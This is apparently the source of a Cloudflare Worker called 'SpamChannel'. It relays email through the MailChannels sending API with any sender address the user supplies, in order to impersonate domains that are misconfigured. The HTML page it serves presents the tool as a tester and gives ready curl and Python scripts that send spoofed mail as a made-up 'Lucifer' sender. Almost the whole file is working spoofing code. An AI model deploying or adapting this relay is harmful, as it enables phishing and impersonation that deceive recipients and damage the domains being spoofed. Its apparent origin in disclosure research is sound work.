async function readRequestBody(request) {
    const { headers } = request;
    const contentType = headers.get('content-type') || '';
    
    if (contentType.includes('application/json')) {
      return JSON.stringify(await request.json());

    } else if (contentType.includes('form')) {
      const formData = await request.formData();
      const body = {};

      for (const entry of formData.entries()) {
        body[entry[0]] = entry[1];
      }

      let data = JSON.parse(JSON.stringify(body));
      let combine = { personalizations:
            [{ 
                to:[{ email: data.to, name: data.ton}],
                //dkim_domain: data.dkim,
                //dkim_selector: data.dkims,
                //dkim_private_key: data.dkimpk
            }],
            from: { email: data.from, name: data.fromn },
            reply_to:{ email: data.rep, name: data.repn },
            subject: data.sbj,
            content: [{ type: data.type, value: data.body }]
          };
      
      //console.log(JSON.stringify(combine));
      
      return JSON.stringify(combine);

    } else {
      return { success: false } ;
    }
  }

  async function handleRequest(request) {
    let start = Date.now();
    let reqBody = await readRequestBody(request);
    let send_request = new Request("https://api.mailchannels.net/tx/v1/send", {
      "method": "POST",
      "headers": {
        "content-type": "application/json",
      },
      "body": reqBody
    });

    let resp = await fetch(send_request);
    let respText = await resp.text();
    let end = Date.now();
    let total = end - start;
    return new Response(`${resp.status} ${resp.statusText} ${respText}`, {
      headers: {
        "X-MC-Status": resp.status,
        "X-Response-Time": total
      }
    });
  }

  addEventListener('fetch', event => {
    const { request } = event;
    const { url } = request;
    const hostname = new URL(request.url).hostname
    const apiUrl = `https://${hostname}/`

    const htmlForm =`<!DOCTYPE html>
    <html>
    <head>
    <meta content="width=device-width,initial-scale=1" name="viewport">
    <title>SpamChannel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/an-old-hope.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
    <script>hljs.highlightAll();</script>
  
    <body>
    <h2>SpamChannel Tester</h1>
  
    <p>For more info see this blog post. The code for this Cloudflare Worker is <a href="https://github.com/byt3bl33d3r/SpamChannel">here</a>.</p>
  
    <p>Use the below form to send an email and test if a domain using MailChannels is misconfigured and can be impersonated.</p>
    <br>
  
    (*) is required
    <form action="/" method="POST" autocomplete="on">
    <input name="from" type="email" placeholder="sender@example.com *" required>
    <input name="fromn" type="text" placeholder="Sender Name"><br>
    <br>
    <input name="to" type="email" placeholder="receiver@example.com *" required>
    <input name="ton" type="text" placeholder="Receiver Name"><br>
    <br>
    <input name="rep" type="email" placeholder="reply-to@example.com">
    <input name="repn" type="text" placeholder="Replier Name"><br>
  
    <!--
    <input name="dkim" type="text" placeholder="DKIM Domain"><br>
    <input name="dkims" type="text" placeholder="DKIM Selector"><br>
    <textarea name="dkimpk" rows="4" cols="23" type="text" placeholder="DKIM Private Key MIICXQIBAAKBgQCU......."></textarea><br>
    -->
  
    <br>
    <input name="sbj" type="text" placeholder="Email Subject *" required><br><br>
    Mimetype: <select name="type">
    <option value="text/plain; charset=utf-8" selected>Plain</option>
    <option value="text/html; charset=utf-8">HTML</option>
    </select><br>
    <textarea name="body" rows="7" cols="23" placeholder="Email Body *" required></textarea><br><br>
    <input type="submit" value="Submit">
    </form>
  
    <br>
  
    <h3>... or do it programmatically</h3>
  
    <p>Curl:</p>
    <div style="width:50em">
    <pre>
      <code id="curl" class="language-bash">
curl -X POST \\
-H "Accept: application/json" \\
-H "Content-Type: application/json" \\
"${apiUrl}" \\
-d '{
  "personalizations" : [ {
    "to" : [{
      "name" : "",
      "email" : "my@email.com"
  }]}],
  "from": { "email":"lucifer@churchofsatan.com", "name": "Lucifer"},
  "subject" : "subject",
  "content" : [{
    "type" : "text/plain",
    "value" : "Send aircon hot af down here"
  }]
}'
      </code>
    </pre>
    </div>

    <p>Python:</p>
    <div style="width:30em">
    <pre>
      <code class="language-py">
#! /usr/bin/env python3

# This sends an HTML email
# Example: python spam.py myemail.html

import sys
import requests

sender_email = 'satan@churchofsatan.com'
receiver_email = 'me@email.com'

with open(sys.argv[1], 'r') as email_html_file:
  email_html = email_html_file.read()

email_json = {
  "personalizations": [
    {
      "to": [
        {
          "email": receiver_email,
        }
      ]
    }
  ],
  "from": {
    "email": sender_email,
    "name": "Lucifer"
  },
  "subject": "Hell is hot",
  "content": [
    {
      "type": "text/html",
      "value": email_html
    }
  ]
}

print(f"Sending to {receiver_email} from {sender_email}")
r = requests.post(
  '${apiUrl}',
  json=email_json
)
print(r.text, r.status_code)

      </code>
    </pre>
    </div>
  
    </body>
    </html>`;

    if (url.includes('submit')) {
      return event.respondWith(new Response(htmlForm, {headers:{"Content-Type":"text/html"}}));
    }

    if (request.method === 'POST') {
      return event.respondWith(handleRequest(request));

    } else if (request.method === 'GET') {
      return event.respondWith(Response.redirect(request.url + 'submit', 301));
    }

  });